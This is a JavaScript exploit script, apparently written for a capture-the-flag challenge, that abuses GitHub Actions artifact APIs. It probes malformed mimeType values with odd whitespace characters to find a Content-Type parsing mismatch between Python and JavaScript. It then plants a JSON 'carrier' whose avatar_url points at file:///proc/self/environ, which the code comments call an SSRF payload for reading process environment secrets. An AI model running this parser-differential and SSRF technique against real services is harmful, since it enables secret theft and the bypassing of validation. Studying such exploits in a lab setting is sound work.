import {createHash} from 'node:crypto';
import {writeFileSync} from 'node:fs';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const placeholder = Buffer.from('{"probe":"mime"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;

// Candidate CreateArtifact mimeType values. GitHub echoes the stored mimeType into
// the SAS `rsct` override, so anything that survives validation decides the
// Content-Type the CTF app and the postcard each parse.
const CANDIDATES = [
  'application/json',
  'application/json%85',
  '%85application/json',
  'application/json%1f',
  '%1fapplication/json',
  '\u0085application/json',
  'application/json\u0085',
  'application/json%20',
  'application/json%c2%85',
  'application/json%2585',
  'application/json&rsct=application%2Fjson%85',
  'application/json%0a',
];

// Characters str.strip() removes but String.prototype.trim() keeps, and vice versa.
const PY_SPACE = new Set([...'\t\n\u000b\f\r\u001c\u001d\u001e\u001f \u0085      　',
  ...Array.from({length: 11}, (_, i) => String.fromCharCode(0x2000 + i))]);

const jsType = value => value.split(',', 1)[0].split(';', 1)[0].trim().toLowerCase();

function pyType(value) {
  let head = value.split(',')[0];
  head = head.split(';')[0];
  let start = 0;
  let end = head.length;
  while (start < end && PY_SPACE.has(head[start])) start += 1;
  while (end > start && PY_SPACE.has(head[end - 1])) end -= 1;
  return head.slice(start, end).toLowerCase();
}

const escape = value => value === null || value === undefined
  ? value
  : JSON.stringify(value).slice(1, -1).replace(/[\u0080-￿]/g,
    ch => `\\u${ch.charCodeAt(0).toString(16).padStart(4, '0')}`);

async function create(name, mimeType) {
  try {
    const value = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      version: 4,
      mimeType: StringValue.create({value: mimeType}),
    });
    return {ok: true, url: value.signedUploadUrl};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

async function upload(url, bytes) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: 'application/json'},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    const url = new URL(value.signedUrl);
    const rawQuery = url.search.slice(1).split('&').filter(part => part.startsWith('rsct'));
    return {ok: true, url: value.signedUrl, rsctRaw: rawQuery.join('&'),
      rsct: url.searchParams.get('rsct')};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

// The decisive oracle: what Content-Type does the blob store actually emit?
async function served(url) {
  if (!url) return {ok: false, error: 'no url'};
  try {
    const response = await fetch(url);
    return {ok: true, status: response.status,
      contentType: response.headers.get('content-type')};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

function carrierBytes(repository) {
  return Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette artifact',
    stargazers_count: 0,
  }));
}

async function trial(index, mimeType) {
  const name = `cassette-${process.env.GITHUB_RUN_ID}-${index}`;
  const created = await create(name, mimeType);
  await upload(created.url, placeholder).catch(() => false);
  const final = await finalize(name);
  const view = await inspect(name);
  const probe = await served(view.url);
  const row = {
    index, name, mimeType: escape(mimeType), id: final.id ?? null,
    createError: created.ok ? undefined : created.error,
    finalError: final.ok ? undefined : final.error,
    viewError: view.ok ? undefined : view.error,
    rsctRaw: view.rsctRaw ?? null,
    rsct: escape(view.rsct ?? null),
    servedStatus: probe.status ?? null,
    servedContentType: escape(probe.contentType ?? null),
  };
  if (probe.contentType) {
    row.pyType = escape(pyType(probe.contentType));
    row.jsType = escape(jsType(probe.contentType));
    row.differential = row.pyType === 'application/json' && row.jsType !== 'application/json';
  }
  // Replace the blob with the SSRF payload so the artifact is immediately usable.
  if (final.id && created.url) {
    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${final.id}/zip`;
    const placed = await upload(created.url, carrierBytes(repository)).catch(() => false);
    row.repository = repository;
    row.carrierPlaced = Boolean(placed);
  }
  console.log(`ROW ${JSON.stringify(row)}`);
  return row;
}

const rows = [];
for (let i = 0; i < CANDIDATES.length; i += 4) {
  rows.push(...await Promise.all(
    CANDIDATES.slice(i, i + 4).map((mime, offset) => trial(i + offset, mime)),
  ));
}
const winners = rows.filter(row => row.differential && row.id && row.carrierPlaced);
const summary = {
  total: rows.length,
  differential: winners.length,
  servedTypes: Object.fromEntries(
    Object.entries(rows.reduce((acc, row) => {
      const key = String(row.servedContentType);
      acc[key] = (acc[key] || 0) + 1;
      return acc;
    }, {})),
  ),
};
console.log(`MIME_SUMMARY ${JSON.stringify(summary)}`);
writeFileSync('carrier-results.json', JSON.stringify({
  runId: process.env.GITHUB_RUN_ID,
  repository: process.env.GITHUB_REPOSITORY,
  winners,
  summary,
  rows,
}, null, 2) + '\n');
